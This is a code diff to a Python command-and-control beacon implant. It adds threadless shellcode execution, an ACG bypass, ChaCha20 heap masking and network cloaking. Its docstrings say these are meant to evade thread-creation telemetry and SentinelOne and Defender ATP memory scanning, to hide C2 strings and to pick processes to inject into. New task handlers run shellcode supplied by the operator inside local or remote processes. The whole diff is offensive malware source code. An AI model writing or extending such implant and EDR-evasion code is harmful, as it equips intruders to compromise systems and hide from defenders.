@@ -94,6 +94,65 @@ except ImportError:
     InjectionTechnique = None
     print("[!] Process injection masterclass not available")
 
+# NEW: Import threadless execution engine
+try:
+    from evasion.threadless_execution import (
+        ThreadlessExecutor,
+        ThreadlessTechnique,
+        ExecutionResult,
+        EvasiveBeaconThreadless,
+    )
+    THREADLESS_AVAILABLE = True
+except ImportError:
+    THREADLESS_AVAILABLE = False
+    ThreadlessExecutor = None
+    ThreadlessTechnique = None
+    ExecutionResult = None
+    EvasiveBeaconThreadless = None
+    print("[!] Threadless execution engine not available")
+
+# NEW: Import ACG bypass
+try:
+    from evasion.acg_bypass import ACGBypass, is_acg_enabled
+    ACG_BYPASS_AVAILABLE = True
+except ImportError:
+    ACG_BYPASS_AVAILABLE = False
+    ACGBypass = None
+    is_acg_enabled = None
+    print("[!] ACG bypass not available")
+
+# NEW: Import heap masking engine
+try:
+    from evasion.heap_masking import (
+        HeapMaskingEngine,
+        MaskingAlgorithm,
+        MaskingResult,
+        EvasiveBeaconHeapMasking,
+    )
+    HEAP_MASKING_AVAILABLE = True
+except ImportError:
+    HEAP_MASKING_AVAILABLE = False
+    HeapMaskingEngine = None
+    MaskingAlgorithm = None
+    MaskingResult = None
+    EvasiveBeaconHeapMasking = None
+    print("[!] Heap masking engine not available")
+
+# NEW: Import network cloaking engine
+try:
+    from evasion.network_cloaking import (
+        MonolithNetworkCloaker,
+        ProcessLegitimacy,
+        NetworkCloakResult,
+    )
+    NETWORK_CLOAKING_AVAILABLE = True
+except ImportError:
+    NETWORK_CLOAKING_AVAILABLE = False
+    MonolithNetworkCloaker = None
+    ProcessLegitimacy = None
+    NetworkCloakResult = None
+    print("[!] Network cloaking engine not available")
+
 # NEW: Import syscall obfuscation monster
 try:
     from evasion.syscall_obfuscator import (
@@ -388,7 +447,53 @@ class EvasiveBeacon:
         self.injection_engine = None
         if INJECTION_AVAILABLE and config.enable_injection:
             self._init_injection()
-        
+
+        # NEW: Initialize threadless execution engine
+        self.threadless_executor = None
+        if THREADLESS_AVAILABLE:
+            try:
+                self.threadless_executor = EvasiveBeaconThreadless()
+                print("[+] Threadless execution engine initialized")
+            except Exception as e:
+                print(f"[!] Failed to initialize threadless executor: {e}")
+                self.threadless_executor = None
+
+        # NEW: Initialize ACG bypass engine
+        self.acg_bypass = None
+        if ACG_BYPASS_AVAILABLE:
+            try:
+                self.acg_bypass = ACGBypass()
+                print("[+] ACG bypass engine initialized")
+            except Exception as e:
+                print(f"[!] Failed to initialize ACG bypass: {e}")
+                self.acg_bypass = None
+
+        # NEW: Initialize heap masking engine
+        self.heap_masking = None
+        if HEAP_MASKING_AVAILABLE:
+            try:
+                self.heap_masking = EvasiveBeaconHeapMasking(config={
+                    'algorithm': 'chacha20',
+                    'sensitive_strings': [
+                        'https://', 'http://', 'beacon', 'payload',
+                        'shellcode', 'cmd', 'powershell', 'upload', 'download'
+                    ]
+                })
+                print("[+] Heap masking engine initialized")
+            except Exception as e:
+                print(f"[!] Failed to initialize heap masking: {e}")
+                self.heap_masking = None
+
+        # NEW: Initialize network cloaking engine
+        self.network_cloaker = None
+        if NETWORK_CLOAKING_AVAILABLE:
+            try:
+                self.network_cloaker = MonolithNetworkCloaker(beacon_config=config)
+                print("[+] Network cloaking engine initialized")
+            except Exception as e:
+                print(f"[!] Failed to initialize network cloaking: {e}")
+                self.network_cloaker = None
+
         # NEW: Initialize syscall obfuscation engine
         self.syscall_obfuscator = None
         if SYSCALL_OBFUSCATOR_AVAILABLE and config.enable_syscall_obfuscation:
@@ -464,6 +569,9 @@ class EvasiveBeacon:
             "persist": self._handle_persist,
             "migrate": self._handle_migrate,
             "inject": self._handle_inject,  # NEW
+            "threadless": self._handle_threadless,  # NEW
+            "heap_mask": self._handle_heap_mask,  # NEW
+            "network_cloak": self._handle_network_cloak,  # NEW
             "report": self._handle_report,  # NEW: Report generation handler
             "mimicry": self._handle_mimicry,  # NEW: Behavioral mimicry handler
             "quantum": self._handle_quantum,  # NEW: Quantum crypto handler
@@ -1660,6 +1768,144 @@ class EvasiveBeacon:
                 
         except Exception as e:
             return f"Injection error: {e}"
+    
+    def _handle_threadless(self, task: Dict) -> str:
+        """
+        Execute shellcode without creating new threads.
+        Evades CreateThread / NtCreateThreadEx telemetry.
+        """
+        if not self.threadless_executor:
+            return "Threadless execution failed: engine not available"
+
+        shellcode_b64 = task.get('shellcode')
+        technique = task.get('technique', 'current_thread')
+        target_pid = task.get('pid')
+
+        if not shellcode_b64:
+            return "Threadless execution failed: no shellcode provided"
+
+        try:
+            import base64
+            shellcode = base64.b64decode(shellcode_b64)
+
+            kwargs = {}
+            if target_pid is not None:
+                kwargs['target_pid'] = int(target_pid)
+
+            result = self.threadless_executor.run_shellcode(
+                shellcode,
+                technique=technique,
+                **kwargs,
+            )
+
+            if result.success:
+                return json.dumps({
+                    "status": "success",
+                    "technique": result.technique.value if result.technique else technique,
+                    "pid": result.pid,
+                    "tid": result.tid,
+                    "output": result.output.decode('utf-8', 'replace') if isinstance(result.output, bytes) else str(result.output),
+                })
+            else:
+                return f"Threadless execution failed: {result.error}"
+        except Exception as e:
+            return f"Threadless execution error: {e}"
+    
+    def _handle_heap_mask(self, task: Dict) -> str:
+        """
+        Mask sensitive heap/config strings before sleep or memory scan.
+        Evades SentinelOne / Defender ATP memory scanning.
+        """
+        if not self.heap_masking:
+            return "Heap masking failed: engine not available"
+
+        action = task.get('action', 'mask')
+        data_b64 = task.get('data')
+        duration = float(task.get('duration', 0))
+        strings = task.get('strings', [
+            'https://', 'http://', 'beacon', 'payload',
+            'shellcode', 'cmd', 'powershell', 'upload', 'download'
+        ])
+
+        try:
+            if action == 'unmask' and data_b64:
+                import base64
+                data = base64.b64decode(data_b64)
+                result = self.heap_masking.post_wake_unmask(data)
+                return json.dumps({
+                    "status": "unmasked" if result.success else "failed",
+                    "bytes_processed": result.bytes_encrypted,
+                    "regions": result.regions_masked,
+                    "algorithm": result.algorithm.value if result.algorithm else None,
+                })
+
+            if action == 'sleep_mask' and duration > 0:
+                self.heap_masking.mask_and_sleep(duration)
+                return json.dumps({
+                    "status": "masked_and_slept",
+                    "duration": duration,
+                })
+
+            sensitive_data = task.get('data')
+            if sensitive_data:
+                if isinstance(sensitive_data, str):
+                    sensitive_data = sensitive_data.encode('utf-8')
+                result = self.heap_masking.pre_sleep_mask(sensitive_data)
+                return json.dumps({
+                    "status": "masked" if result.success else "failed",
+                    "bytes_processed": result.bytes_encrypted,
+                    "regions": result.regions_masked,
+                    "algorithm": result.algorithm.value if result.algorithm else None,
+                })
+
+            return "Heap mask: no action/data provided"
+        except Exception as e:
+            return f"Heap mask error: {e}"
+    
+    def _handle_network_cloak(self, task: Dict) -> str:
+        """
+        Context-aware network cloaking.
+        - Assess process legitimacy for network traffic
+        - Mask C2 strings before outbound requests
+        - Recommend injection target if current process is suspicious
+        """
+        if not self.network_cloaker:
+            return "Network cloak failed: engine not available"
+
+        action = task.get('action', 'assess')
+        data_b64 = task.get('data')
+        strings = task.get('strings', [
+            self.config.c2_host,
+            'https://', 'http://',
+            'beacon', 'payload', 'shellcode',
+            'cmd', 'powershell', 'upload', 'download'
+        ])
+
+        try:
+            if action == 'assess':
+                report = self.network_cloaker.build_legitimacy_report()
+                return json.dumps(report)
+
+            if action == 'mask' and data_b64:
+                import base64
+                data = base64.b64decode(data_b64)
+                masked, result = self.network_cloaker.pre_network_mask(data, strings)
+                return json.dumps({
+                    "status": "masked" if result.success else "failed",
+                    "masked_strings": result.masked_strings,
+                    "legitimacy": result.legitimacy.value if result.legitimacy else "unknown",
+                })
+
+            if action == 'recommend':
+                target = self.network_cloaker.get_recommended_injection_target()
+                return json.dumps({
+                    "recommended_process": target,
+                    "reason": "Process legitimacy requires network cloaking via injection",
+                })
+
+            return "Network cloak: no action provided"
+        except Exception as e:
+            return f"Network cloak error: {e}"
     
     def get_injection_status(self) -> Dict[str, Any]:
         """Get injection engine status"""
